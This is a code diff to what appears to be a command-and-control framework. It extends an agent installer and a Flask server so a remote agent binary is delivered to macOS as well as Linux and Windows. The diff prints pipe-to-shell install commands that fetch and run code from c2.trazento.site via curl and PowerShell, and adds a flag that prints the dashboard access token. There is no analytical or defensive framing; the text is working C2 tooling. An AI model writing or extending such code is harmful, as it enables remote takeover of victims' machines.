@@ -432,7 +432,7 @@ rm -f "$AGENT"
 echo "[*] C2 Agent installer"
 case "$(uname -s)" in
   Linux)  OS="linux"  ;;
-  Darwin) OS="linux"  ;;
+  Darwin) OS="darwin" ;;
   *)      echo "unsupported OS"; exit 1 ;;
 esac
 ARCH="$(uname -m)"
@@ -441,7 +441,7 @@ case "$ARCH" in
   aarch64|arm64) ARCH="aarch64" ;;
   *) echo "unsupported arch: $ARCH"; exit 1 ;;
 esac
-URL="${C2_AGENT_URL:-https://c2.trazento.site/agent/linux/$ARCH}"
+URL="${C2_AGENT_URL:-https://c2.trazento.site/agent/$OS/$ARCH}"
 echo "[*] Downloading $URL"
 if command -v curl >/dev/null 2>&1; then
   curl -sS -o "$AGENT" "$URL"
@@ -496,7 +496,23 @@ def serve_agent_windows(arch):
     with open(path, 'rb') as f:
         return Response(f.read(), mimetype='application/octet-stream')
 
+@app.route('/agent/darwin/<arch>')
+def serve_agent_darwin(arch):
+    path = os.path.join(BIN_DIR, "c2_agent")
+    if arch not in ("x86_64", "aarch64"):
+        return jsonify({"error": "unsupported arch"}), 400
+    if not os.path.exists(path):
+        return jsonify({"error": "agent binary not found"}), 404
+    with open(path, 'rb') as f:
+        return Response(f.read(), mimetype='application/octet-stream')
+
 if __name__ == '__main__':
+    if "--show-token" in sys.argv:
+        cfg = _load_config()
+        tok = cfg.get("dash_token", "not found")
+        print(f"DASH_TOKEN={tok}")
+        sys.exit(0)
+
     use_tls = "--no-tls" not in sys.argv
     raw_key_input = None
     i = 1
@@ -522,9 +538,12 @@ if __name__ == '__main__':
     proto = "https" if use_tls else "http"
     print(f"[C2] Server key: {KEY_B64}")
     print(f"[C2] Dashboard token: {DASH_TOKEN}")
+    print(f"[C2] Config file: {CONFIG_FILE}")
     print(f"[C2] Dashboard: {proto}://127.0.0.1:8443 (use token above)")
     print(f"[C2] Install (Linux): curl -sS https://c2.trazento.site/install.sh | sh")
+    print(f"[C2] Install (macOS): curl -sS https://c2.trazento.site/install.sh | sh")
     print(f"[C2] Install (Windows): iex (iwr https://c2.trazento.site/install.ps1)")
+    print(f"[C2] To show token later: {sys.argv[0]} --show-token")
     print(f"[C2] Listening on {proto}://0.0.0.0:8443")
     if use_tls:
         ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
